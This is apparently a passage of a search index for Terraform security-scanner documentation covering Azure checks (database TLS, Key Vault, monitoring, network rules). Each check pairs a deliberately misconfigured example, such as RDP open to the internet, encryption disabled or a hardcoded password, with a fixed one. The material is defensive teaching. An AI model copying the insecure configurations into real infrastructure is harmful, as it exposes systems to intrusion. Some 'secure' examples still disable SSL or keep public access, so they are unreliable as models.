resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"missadministrator\"\n   administrator_login_password = \"thisIsKat11\"\n   minimum_tls_version          = \"1.2\"\n }\n\n resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"bad_example\"\n\n   public_network_access_enabled    = true\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/secure-tls-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced</p> </li> </ul>","title":"Links"},{"location":"checks/azure/database/threat-alert-email-set/","text":"","title":"At least one email address is set for threat alerts"},{"location":"checks/azure/database/threat-alert-email-set/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/database/threat-alert-email-set/#explanation","text":"<p>SQL Server sends alerts for threat detection via email, if there are no email addresses set then mitigation will be delayed.</p>","title":"Explanation"},{"location":"checks/azure/database/threat-alert-email-set/#possible-impact","text":"<p>Nobody will be prompty alerted in the case of a threat being detected</p>","title":"Possible Impact"},{"location":"checks/azure/database/threat-alert-email-set/#suggested-resolution","text":"<p>Provide at least one email address for threat alerts</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/threat-alert-email-set/#insecure-example","text":"<p>The following example will fail the azure-database-threat-alert-email-set check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   email_addresses = []\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/threat-alert-email-set/#secure-example","text":"<p>The following example will pass the azure-database-threat-alert-email-set check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   email_addresses = [\"db-security@acme.org\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/threat-alert-email-set/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses</li> </ul>","title":"Links"},{"location":"checks/azure/database/threat-alert-email-to-owner/","text":"","title":"Security threat alerts go to subscription owners and co-administrators"},{"location":"checks/azure/database/threat-alert-email-to-owner/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/database/threat-alert-email-to-owner/#explanation","text":"<p>Subscription owners should be notified when there are security alerts. By ensuring the administrators of the account have been notified they can quickly assist in any required remediation</p>","title":"Explanation"},{"location":"checks/azure/database/threat-alert-email-to-owner/#possible-impact","text":"<p>Administrators and subscription owners may have a delayed response</p>","title":"Possible Impact"},{"location":"checks/azure/database/threat-alert-email-to-owner/#suggested-resolution","text":"<p>Enable email to subscription owners</p>","title":"Suggested Resolution"},{"location":"checks/azure/database/threat-alert-email-to-owner/#insecure-example","text":"<p>The following example will fail the azure-database-threat-alert-email-to-owner check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n   ]\n   email_account_admins = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/database/threat-alert-email-to-owner/#secure-example","text":"<p>The following example will pass the azure-database-threat-alert-email-to-owner check. <pre><code> resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = []\n\n   email_account_admins = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/database/threat-alert-email-to-owner/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins</li> </ul>","title":"Links"},{"location":"checks/azure/datafactory/","text":"","title":"datafactory"},{"location":"checks/azure/datafactory/#checks","text":"<ul> <li>no-public-access Data Factory should have public access disabled, the default is enabled.</li> </ul>","title":"Checks"},{"location":"checks/azure/datafactory/no-public-access/","text":"","title":"Data Factory should have public access disabled, the default is enabled."},{"location":"checks/azure/datafactory/no-public-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/datafactory/no-public-access/#explanation","text":"<p>Data Factory has public access set to true by default.</p> <p>Disabling public network access is applicable only to the self-hosted integration runtime, not to Azure Integration Runtime and SQL Server Integration Services (SSIS) Integration Runtime.</p>","title":"Explanation"},{"location":"checks/azure/datafactory/no-public-access/#possible-impact","text":"<p>Data factory is publicly accessible</p>","title":"Possible Impact"},{"location":"checks/azure/datafactory/no-public-access/#suggested-resolution","text":"<p>Set public access to disabled for Data Factory</p>","title":"Suggested Resolution"},{"location":"checks/azure/datafactory/no-public-access/#insecure-example","text":"<p>The following example will fail the azure-datafactory-no-public-access check. <pre><code> resource \"azurerm_data_factory\" \"bad_example\" {\n   name                = \"example\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/datafactory/no-public-access/#secure-example","text":"<p>The following example will pass the azure-datafactory-no-public-access check. <pre><code> resource \"azurerm_data_factory\" \"good_example\" {\n   name                = \"example\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   public_network_enabled = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/datafactory/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/data-factory/data-movement-security-considerations#hybrid-scenarios</p> </li> </ul>","title":"Links"},{"location":"checks/azure/datalake/","text":"","title":"datalake"},{"location":"checks/azure/datalake/#checks","text":"<ul> <li>enable-at-rest-encryption Unencrypted data lake storage.</li> </ul>","title":"Checks"},{"location":"checks/azure/datalake/enable-at-rest-encryption/","text":"","title":"Unencrypted data lake storage."},{"location":"checks/azure/datalake/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#explanation","text":"<p>Datalake storage encryption defaults to Enabled, it shouldn't be overridden to Disabled.</p>","title":"Explanation"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#possible-impact","text":"<p>Data could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable encryption of data lake storage</p>","title":"Suggested Resolution"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the azure-datalake-enable-at-rest-encryption check. <pre><code> resource \"azurerm_data_lake_store\" \"bad_example\" {\n    encryption_state = \"Disabled\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the azure-datalake-enable-at-rest-encryption check. <pre><code> resource \"azurerm_data_lake_store\" \"good_example\" {\n    encryption_state = \"Enabled\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/datalake/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/data-lake-store/data-lake-store-security-overview</p> </li> </ul>","title":"Links"},{"location":"checks/azure/keyvault/","text":"","title":"keyvault"},{"location":"checks/azure/keyvault/#checks","text":"<ul> <li> <p>content-type-for-secret Key vault Secret should have a content type set</p> </li> <li> <p>ensure-key-expiry Ensure that the expiration date is set on all keys</p> </li> <li> <p>ensure-secret-expiry Key Vault Secret should have an expiration date set</p> </li> <li> <p>no-purge Key vault should have purge protection enabled</p> </li> <li> <p>specify-network-acl Key vault should have the network acl block specified</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/keyvault/content-type-for-secret/","text":"","title":"Key vault Secret should have a content type set"},{"location":"checks/azure/keyvault/content-type-for-secret/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/keyvault/content-type-for-secret/#explanation","text":"<p>Content Type is an optional Key Vault Secret behavior and is not enabled by default.</p> <p>Clients may specify the content type of a secret to assist in interpreting the secret data when it's retrieved. The maximum length of this field is 255 characters. There are no pre-defined values. The suggested usage is as a hint for interpreting the secret data.</p>","title":"Explanation"},{"location":"checks/azure/keyvault/content-type-for-secret/#possible-impact","text":"<p>The secret's type is unclear without a content type</p>","title":"Possible Impact"},{"location":"checks/azure/keyvault/content-type-for-secret/#suggested-resolution","text":"<p>Provide content type for secrets to aid interpretation on retrieval</p>","title":"Suggested Resolution"},{"location":"checks/azure/keyvault/content-type-for-secret/#insecure-example","text":"<p>The following example will fail the azure-keyvault-content-type-for-secret check. <pre><code> resource \"azurerm_key_vault_secret\" \"bad_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/keyvault/content-type-for-secret/#secure-example","text":"<p>The following example will pass the azure-keyvault-content-type-for-secret check. <pre><code> resource \"azurerm_key_vault_secret\" \"good_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n   content_type = \"password\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/keyvault/content-type-for-secret/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets</p> </li> </ul>","title":"Links"},{"location":"checks/azure/keyvault/ensure-key-expiry/","text":"","title":"Ensure that the expiration date is set on all keys"},{"location":"checks/azure/keyvault/ensure-key-expiry/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/keyvault/ensure-key-expiry/#explanation","text":"<p>Expiration Date is an optional Key Vault Key behavior and is not set by default.</p> <p>Set when the resource will be become inactive.</p>","title":"Explanation"},{"location":"checks/azure/keyvault/ensure-key-expiry/#possible-impact","text":"<p>Long life keys increase the attack surface when compromised</p>","title":"Possible Impact"},{"location":"checks/azure/keyvault/ensure-key-expiry/#suggested-resolution","text":"<p>Set an expiration date on the vault key</p>","title":"Suggested Resolution"},{"location":"checks/azure/keyvault/ensure-key-expiry/#insecure-example","text":"<p>The following example will fail the azure-keyvault-ensure-key-expiry check. <pre><code> resource \"azurerm_key_vault_key\" \"bad_example\" {\n   name         = \"generated-certificate\"\n   key_vault_id = azurerm_key_vault.example.id\n   key_type     = \"RSA\"\n   key_size     = 2048\n\n   key_opts = [\n     \"decrypt\",\n     \"encrypt\",\n     \"sign\",\n     \"unwrapKey\",\n     \"verify\",\n     \"wrapKey\",\n   ]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/keyvault/ensure-key-expiry/#secure-example","text":"<p>The following example will pass the azure-keyvault-ensure-key-expiry check. <pre><code> resource \"azurerm_key_vault_key\" \"good_example\" {\n   name         = \"generated-certificate\"\n   key_vault_id = azurerm_key_vault.example.id\n   key_type     = \"RSA\"\n   key_size     = 2048\n   expiration_date = \"1982-12-31T00:00:00Z\"\n\n   key_opts = [\n     \"decrypt\",\n     \"encrypt\",\n     \"sign\",\n     \"unwrapKey\",\n     \"verify\",\n     \"wrapKey\",\n   ]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/keyvault/ensure-key-expiry/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date</p> </li> <li> <p>https://docs.microsoft.com/en-us/powershell/module/az.keyvault/update-azkeyvaultkey?view=azps-5.8.0#example-1--modify-a-key-to-enable-it--and-set-the-expiration-date-and-tags</p> </li> </ul>","title":"Links"},{"location":"checks/azure/keyvault/ensure-secret-expiry/","text":"","title":"Key Vault Secret should have an expiration date set"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#explanation","text":"<p>Expiration Date is an optional Key Vault Secret behavior and is not set by default.</p> <p>Set when the resource will be become inactive.</p>","title":"Explanation"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#possible-impact","text":"<p>Long life secrets increase the opportunity for compromise</p>","title":"Possible Impact"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#suggested-resolution","text":"<p>Set an expiry for secrets</p>","title":"Suggested Resolution"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#insecure-example","text":"<p>The following example will fail the azure-keyvault-ensure-secret-expiry check. <pre><code> resource \"azurerm_key_vault_secret\" \"bad_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#secure-example","text":"<p>The following example will pass the azure-keyvault-ensure-secret-expiry check. <pre><code> resource \"azurerm_key_vault_secret\" \"good_example\" {\n   name            = \"secret-sauce\"\n   value           = \"szechuan\"\n   key_vault_id    = azurerm_key_vault.example.id\n   expiration_date = \"1982-12-31T00:00:00Z\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/keyvault/ensure-secret-expiry/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets</p> </li> </ul>","title":"Links"},{"location":"checks/azure/keyvault/no-purge/","text":"","title":"Key vault should have purge protection enabled"},{"location":"checks/azure/keyvault/no-purge/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/keyvault/no-purge/#explanation","text":"<p>Purge protection is an optional Key Vault behavior and is not enabled by default.</p> <p>Purge protection can only be enabled once soft-delete is enabled. It can be turned on via CLI or PowerShell.</p>","title":"Explanation"},{"location":"checks/azure/keyvault/no-purge/#possible-impact","text":"<p>Keys could be purged from the vault without protection</p>","title":"Possible Impact"},{"location":"checks/azure/keyvault/no-purge/#suggested-resolution","text":"<p>Enable purge protection for key vaults</p>","title":"Suggested Resolution"},{"location":"checks/azure/keyvault/no-purge/#insecure-example","text":"<p>The following example will fail the azure-keyvault-no-purge check. <pre><code> resource \"azurerm_key_vault\" \"bad_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.bad_example.location\n     enabled_for_disk_encryption = true\n     purge_protection_enabled    = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/keyvault/no-purge/#secure-example","text":"<p>The following example will pass the azure-keyvault-no-purge check. <pre><code> resource \"azurerm_key_vault\" \"good_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.good_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/keyvault/no-purge/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/key-vault/general/soft-delete-overview#purge-protection</p> </li> </ul>","title":"Links"},{"location":"checks/azure/keyvault/specify-network-acl/","text":"","title":"Key vault should have the network acl block specified"},{"location":"checks/azure/keyvault/specify-network-acl/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/keyvault/specify-network-acl/#explanation","text":"<p>Network ACLs allow you to reduce your exposure to risk by limiting what can access your key vault. </p> <p>The default action of the Network ACL should be set to deny for when IPs are not matched. Azure services can be allowed to bypass.</p>","title":"Explanation"},{"location":"checks/azure/keyvault/specify-network-acl/#possible-impact","text":"<p>Without a network ACL the key vault is freely accessible</p>","title":"Possible Impact"},{"location":"checks/azure/keyvault/specify-network-acl/#suggested-resolution","text":"<p>Set a network ACL for the key vault</p>","title":"Suggested Resolution"},{"location":"checks/azure/keyvault/specify-network-acl/#insecure-example","text":"<p>The following example will fail the azure-keyvault-specify-network-acl check. <pre><code> resource \"azurerm_key_vault\" \"bad_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.bad_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/keyvault/specify-network-acl/#secure-example","text":"<p>The following example will pass the azure-keyvault-specify-network-acl check. <pre><code> resource \"azurerm_key_vault\" \"good_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.good_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = false\n\n     network_acls {\n         bypass = \"AzureServices\"\n         default_action = \"Deny\"\n     }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/keyvault/specify-network-acl/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/key-vault/general/network-security</p> </li> </ul>","title":"Links"},{"location":"checks/azure/monitor/","text":"","title":"monitor"},{"location":"checks/azure/monitor/#checks","text":"<ul> <li> <p>activity-log-retention-set Ensure the activity retention log is set to at least a year</p> </li> <li> <p>capture-all-activities Ensure log profile captures all activities</p> </li> <li> <p>capture-all-regions Ensure activitys are captured for all locations</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/monitor/activity-log-retention-set/","text":"","title":"Ensure the activity retention log is set to at least a year"},{"location":"checks/azure/monitor/activity-log-retention-set/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/monitor/activity-log-retention-set/#explanation","text":"<p>The average time to detect a breach is up to 210 days, to ensure that all the information required for an effective investigation is available, the retention period should allow for delayed starts to investigating.</p>","title":"Explanation"},{"location":"checks/azure/monitor/activity-log-retention-set/#possible-impact","text":"<p>Short life activity logs can lead to missing records when investigating a breach</p>","title":"Possible Impact"},{"location":"checks/azure/monitor/activity-log-retention-set/#suggested-resolution","text":"<p>Set a retention period that will allow for delayed investigation</p>","title":"Suggested Resolution"},{"location":"checks/azure/monitor/activity-log-retention-set/#insecure-example","text":"<p>The following example will fail the azure-monitor-activity-log-retention-set check. <pre><code> resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n\n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/monitor/activity-log-retention-set/#secure-example","text":"<p>The following example will pass the azure-monitor-activity-log-retention-set check. <pre><code> resource \"azurerm_monitor_log_profile\" \"good_example\" {\n   name = \"good_example\"\n\n   retention_policy {\n     enabled = true\n     days    = 365\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/monitor/activity-log-retention-set/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/platform-logs-overview</p> </li> </ul>","title":"Links"},{"location":"checks/azure/monitor/capture-all-activities/","text":"","title":"Ensure log profile captures all activities"},{"location":"checks/azure/monitor/capture-all-activities/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/monitor/capture-all-activities/#explanation","text":"<p>Log profiles should capture all categories to ensure that all events are logged</p>","title":"Explanation"},{"location":"checks/azure/monitor/capture-all-activities/#possible-impact","text":"<p>Log profile must capture all activity to be able to ensure that all relevant information possible is available for an investigation</p>","title":"Possible Impact"},{"location":"checks/azure/monitor/capture-all-activities/#suggested-resolution","text":"<p>Configure log profile to capture all activities</p>","title":"Suggested Resolution"},{"location":"checks/azure/monitor/capture-all-activities/#insecure-example","text":"<p>The following example will fail the azure-monitor-capture-all-activities check. <pre><code> resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n\n   categories = []\n\n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/monitor/capture-all-activities/#secure-example","text":"<p>The following example will pass the azure-monitor-capture-all-activities check. <pre><code> resource \"azurerm_monitor_log_profile\" \"good_example\" {\n   name = \"good_example\"\n\n   categories = [\n      \"Action\",\n      \"Delete\",\n      \"Write\",\n   ]\n\n   retention_policy {\n     enabled = true\n     days    = 365\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/monitor/capture-all-activities/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log</p> </li> <li> <p>https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters</p> </li> </ul>","title":"Links"},{"location":"checks/azure/monitor/capture-all-regions/","text":"","title":"Ensure activitys are captured for all locations"},{"location":"checks/azure/monitor/capture-all-regions/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/monitor/capture-all-regions/#explanation","text":"<p>Log profiles should capture all regions to ensure that all events are logged</p>","title":"Explanation"},{"location":"checks/azure/monitor/capture-all-regions/#possible-impact","text":"<p>Activity may be occurring in locations that aren't being monitored</p>","title":"Possible Impact"},{"location":"checks/azure/monitor/capture-all-regions/#suggested-resolution","text":"<p>Enable capture for all locations</p>","title":"Suggested Resolution"},{"location":"checks/azure/monitor/capture-all-regions/#insecure-example","text":"<p>The following example will fail the azure-monitor-capture-all-regions check. <pre><code> resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n\n   categories = []\n\n   locations = [\n     \"westus\",\n     \"global\",\n   ]\n\n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/monitor/capture-all-regions/#secure-example","text":"<p>The following example will pass the azure-monitor-capture-all-regions check. <pre><code> resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n\n   categories = []\n\n   locations = [\n    \"eastus\",\n    \"eastus2\",\n    \"southcentralus\",\n    \"westus2\",\n    \"westus3\",\n    \"australiaeast\",\n    \"southeastasia\",\n    \"northeurope\",\n    \"swedencentral\",\n    \"uksouth\",\n    \"westeurope\",\n    \"centralus\",\n    \"northcentralus\",\n    \"westus\",\n    \"southafricanorth\",\n    \"centralindia\",\n    \"eastasia\",\n    \"japaneast\",\n    \"jioindiawest\",\n    \"koreacentral\",\n    \"canadacentral\",\n    \"francecentral\",\n    \"germanywestcentral\",\n    \"norwayeast\",\n    \"switzerlandnorth\",\n    \"uaenorth\",\n    \"brazilsouth\",\n    \"centralusstage\",\n    \"eastusstage\",\n    \"eastus2stage\",\n    \"northcentralusstage\",\n    \"southcentralusstage\",\n    \"westusstage\",\n    \"westus2stage\",\n    \"asia\",\n    \"asiapacific\",\n    \"australia\",\n    \"brazil\",\n    \"canada\",\n    \"europe\",\n    \"global\",\n    \"india\",\n    \"japan\",\n    \"uk\",\n    \"unitedstates\",\n    \"eastasiastage\",\n    \"southeastasiastage\",\n    \"centraluseuap\",\n    \"eastus2euap\",\n    \"westcentralus\",\n    \"southafricawest\",\n    \"australiacentral\",\n    \"australiacentral2\",\n    \"australiasoutheast\",\n    \"japanwest\",\n    \"jioindiacentral\",\n    \"koreasouth\",\n    \"southindia\",\n    \"westindia\",\n    \"canadaeast\",\n    \"francesouth\",\n    \"germanynorth\",\n    \"norwaywest\",\n    \"swedensouth\",\n    \"switzerlandwest\",\n    \"ukwest\",\n    \"uaecentral\",\n    \"brazilsoutheast\",\n   ]\n\n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/monitor/capture-all-regions/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations</p> </li> <li> <p>https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters</p> </li> </ul>","title":"Links"},{"location":"checks/azure/network/","text":"","title":"network"},{"location":"checks/azure/network/#checks","text":"<ul> <li> <p>disable-rdp-from-internet RDP access should not be accessible from the Internet, should be blocked on port 3389</p> </li> <li> <p>no-public-egress An outbound network security rule allows traffic to /0.</p> </li> <li> <p>no-public-ingress An inbound network security rule allows traffic from /0.</p> </li> <li> <p>retention-policy-set Retention policy for flow logs should be enabled and set to greater than 90 days</p> </li> <li> <p>ssh-blocked-from-internet SSH access should not be accessible from the Internet, should be blocked on port 22</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/network/disable-rdp-from-internet/","text":"","title":"RDP access should not be accessible from the Internet, should be blocked on port 3389"},{"location":"checks/azure/network/disable-rdp-from-internet/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/network/disable-rdp-from-internet/#explanation","text":"<p>RDP access can be configured on either the network security group or in the network security group rule.</p> <p>RDP access should not be permitted from the internet (*, 0.0.0.0, /0, internet, any). Consider using the Azure Bastion Service.</p>","title":"Explanation"},{"location":"checks/azure/network/disable-rdp-from-internet/#possible-impact","text":"<p>Anyone from the internet can potentially RDP onto an instance</p>","title":"Possible Impact"},{"location":"checks/azure/network/disable-rdp-from-internet/#suggested-resolution","text":"<p>Block RDP port from internet</p>","title":"Suggested Resolution"},{"location":"checks/azure/network/disable-rdp-from-internet/#insecure-example","text":"<p>The following example will fail the azure-network-disable-rdp-from-internet check. <pre><code> resource \"azurerm_network_security_rule\" \"bad_example\" {\n      name                        = \"bad_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n }\n\n resource \"azurerm_network_security_group\" \"example\" {\n   name                = \"tf-appsecuritygroup\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   security_rule {\n     source_port_range           = \"any\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/network/disable-rdp-from-internet/#secure-example","text":"<p>The following example will pass the azure-network-disable-rdp-from-internet check. <pre><code> resource \"azurerm_network_security_rule\" \"good_example\" {\n      name                        = \"good_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"4.53.160.75\"\n      destination_address_prefix  = \"*\"\n }\n\n resource \"azurerm_network_security_group\" \"example\" {\n   name                = \"tf-appsecuritygroup\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n\n   security_rule {\n     source_port_range           = \"any\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"4.53.160.75\"\n      destination_address_prefix  = \"*\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/network/disable-rdp-from-internet/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/bastion/tutorial-create-host-portal</p> </li> </ul>","title":"Links"},{"location":"checks/azure/network/no-public-egress/","text":"","title":"An outbound network security rule allows traffic to /0."},{"location":"checks/azure/network/no-public-egress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/network/no-public-egress/#explanation","text":"<p>Network security rules should not use very broad subnets.</p> <p>Where possible, segments should be broken into smaller subnets.</p>","title":"Explanation"},{"location":"checks/azure/network/no-public-egress/#possible-impact","text":"<p>The port is exposed for egress to the internet</p>","title":"Possible Impact"},{"location":"checks/azure/network/no-public-egress/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/azure/network/no-public-egress/#insecure-example","text":"<p>The following example will fail the azure-network-no-public-egress check. <pre><code> resource \"azurerm_network_security_rule\" \"bad_example\" {\n    direction = \"Outbound\"\n    